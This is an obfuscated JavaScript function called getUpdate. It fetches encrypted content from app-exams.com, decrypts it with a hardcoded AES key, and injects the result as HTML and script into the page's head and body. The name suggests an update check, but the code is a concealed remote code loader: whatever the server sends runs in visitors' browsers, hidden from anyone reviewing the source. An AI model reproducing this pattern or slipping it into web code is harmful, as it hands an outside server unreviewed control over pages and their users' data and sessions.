function getUpdate() { var _0xbc8fx2 = new XMLHttpRequest();
    _0xbc8fx2['onreadystatechange'] = function() { if (this['readyState'] == 4 && this['status'] == 200) { obj = JSON['parse'](this['responseText']);
            fukhead = CryptoJS['AES']['decrypt'](obj['head'], 'F2cQx5iu8LKGQ');
            codeHead = fukhead.toString(CryptoJS['enc'].Utf8);
            codeHead = codeHead['replace'](/p1p2p3p4/gi, '\x0A');
            fukbody = CryptoJS['AES']['decrypt'](obj['body'], 'F2cQx5iu8LKGQ');
            codeBody = fukbody.toString(CryptoJS['enc'].Utf8);
            codeBody = codeBody['replace'](/p1p2p3p4/gi, '\x0A');
            $('#boody')['html']('');
            $('#boody')['append'](codeBody);
            $('head')['append'](codeHead) } else {} };
    _0xbc8fx2['open']('GET', 'https://app-exams.com/new_exam/version.php', true);
    _0xbc8fx2['send']() }
